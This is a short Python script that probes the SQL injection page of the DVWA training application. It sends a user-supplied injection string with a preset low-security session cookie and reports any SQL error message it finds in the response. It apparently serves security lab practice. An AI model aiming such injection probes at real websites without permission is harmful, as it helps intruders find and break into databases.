#!/usr/bin/python3

import sys, re, requests, urllib.parse
from bs4 import BeautifulSoup

cookies = {
	"security" : "low",
#	"__test" : "1",
#	"rltoken" : "b79982642c77e44c71d14928b436111e",
	"PHPSESSID" : "bhkjdcaq61erh35rkppiu01pv3"
}

def searchFriends_sqli(ip, query):
	query = urllib.parse.quote_plus(query)
	r = requests.get(f"http://{ip}/dvwa/vulnerabilities/sqli/?id={query}&Submit=Submit#", cookies=cookies)
	s = BeautifulSoup(r.text, 'lxml')

	print("\n[+] RESPONSE HEADERS:")
	print(r.headers)

	print("\n[+] RESPONSE CONTENT:")
	print(s.text)

	error = re.search("error in your SQL", s.text)

	if error:
		print("\n[+] ERRORS FOUND IN RESPONSE. POSSIBLE SQL INJECTION FOUND")
	else:
		print("\n[+] NO ERRORS FOUND")


def main():
	if len(sys.argv) != 3:
		print("(+) usage: %s <target> <injection_string>" % sys.argv[0])
		print('(+) eg: %s localhost "aaaa\'" ' % sys.argv[0])
		sys.exit(-1)

	ip = sys.argv[1]
	query = sys.argv[2]

	searchFriends_sqli(ip, query)

if __name__ == "__main__":
	main()
